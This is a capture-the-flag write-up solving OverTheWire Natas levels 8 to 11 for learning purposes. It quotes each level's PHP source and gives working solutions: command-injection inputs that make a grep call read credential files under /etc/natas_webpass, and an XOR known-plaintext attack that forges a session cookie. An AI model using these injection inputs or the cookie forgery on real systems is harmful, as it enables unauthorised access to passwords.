# OverTheWire-Natas
Here are the solutions that I have found for the OverTheWire.com "Natas" Levels. I am working on these ethical hacking questions to gain a better understanding of exploits that people are able to use in the browser so I am able to prevent them in my own work. 

The solutions start at level 8, as the ones before that are fairly simple and don't require any code. 



# Level 8

When we look at the source code, we see 
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
``` 
Looking at the php code, we see that we need to reverse the *encodedSecret* method. 

In a terminal, this code should get the job done.
```
php -r '$passKey=base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));echo $passKey;'
```

and you should get back 

 ```
 oubWYf2kBqr
 ```

 Submit that in the input secret field and you have your password. 
 
 
 
 
# Level 9

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
This code will grep whatever you enter from a dictionary.txt file. 

On this site, we know that passwords are in ```/etc/natas_webpass/natasLevelNumber``` 

We want to get the password for level 10, so we need to navigate there by injecting code into the site. 

Input ```a /etc/natas_webpass/natas10 #``` and you have your password. 



# Level 10

```php 
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
The same thing we did on the last level will work here again. 

Input ```c /etc/natas_webpass/natas11 #```



# Level 11

This is where things start to get harder. Here is what we are given: 
```php
<?  
  
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");  
  
function xor_encrypt($in) {  
    $key = '<censored>';  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
function loadData($def) {  
    global $_COOKIE;  
    $mydata = $def;  
    if(array_key_exists("data", $_COOKIE)) {  
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);  
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {  
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {  
        $mydata['showpassword'] = $tempdata['showpassword'];  
        $mydata['bgcolor'] = $tempdata['bgcolor'];  
        }  
    }  
    }  
    return $mydata;  
}  
  
function saveData($d) {  
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));  
}  
  
$data = loadData($defaultdata);  
  
if(array_key_exists("bgcolor",$_REQUEST)) {  
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {  
        $data['bgcolor'] = $_REQUEST['bgcolor'];  
    }  
}  
  
saveData($data);  
  
  
  
?>  
```
Break it down:
* ```$defaultdata:``` An array containing two values.
* ```showpassword:``` String
* ```bgcolor:``` Contains the div background color. 

How it works: 
* Data is loaded using the ```loadData``` function.
* An array ```$mydata``` stores the default values of ```(“no”, “#ffffff”)```.
* If the cookie sent in the HTTP requests contains a field called data, it tried to decode it as a JSON object. 
* The value has to be decoded in base 64, then XORed by calling ```xor_encrypt```.
* If the JSON is a valid array and contains ```shownopassword``` and ```bgcolor``` fields, then it's written to ```$mydata```
* If ```bgcolor``` key is passed in the request and matches the regex, its saved in the ```$data``` array.
* ```saveData``` stores the cookie with the updated values. 

Tip: 
* XOR encoding is vulnerable to plaintext attacks!

Lets get started:
## Step 1: Preprocess the data
We want to XOR our plain text ```($_data)_``` with the cyphertext ```($_COOKIE["data"]), but we will need to undo any preprocessing before XORing them. 
* Cyphertext needs to be decoded
* ```base64_decode)$_COOKIE["data"]))```
* Default data needs to be json encoded:
* ```json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));```

## Step 2: Get the key
Lets write some php code
```php
<?php  
  
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";  
  
function xor_encrypt($in) {  
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
echo xor_encrypt(base64_decode($cookie));  
  
?> 
```
Now execute the code 

```
$ php -f p.php  
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq  
```

## Step 3: Encode the new data
```php
<?php  
  
$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  
  
function xor_encrypt($in) {  
    $key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq';  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
echo base64_encode(xor_encrypt(json_encode($data)));  
  
?>  
```
```
$ php -f p.php  
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
```

## Step 4: Submit the new cookie and get the password.
```document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"```

Refresh the page and you have the password. 


